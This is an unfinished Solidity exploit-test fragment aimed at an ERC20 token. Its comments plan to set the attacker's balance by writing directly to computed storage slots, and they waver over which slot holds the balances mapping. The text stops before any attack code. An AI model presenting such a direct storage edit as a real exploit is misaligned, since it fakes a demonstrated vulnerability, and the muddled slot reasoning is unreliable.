    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Step 2: Calculate storage slot for balances[attacker]
        // In BasicToken, balances is the first variable (slot 0)
        // For mapping, the slot for a specific key is keccak256(abi.encode(key, slot))
        // Since balances is at slot 1? Let's check: BasicToken has:
        // mapping(address => uint256) internal balances; // This should be slot 0
        // uint256 internal totalSupply_; // This should be slot 1
        // Wait, actually in inheritance chain, need to check properly

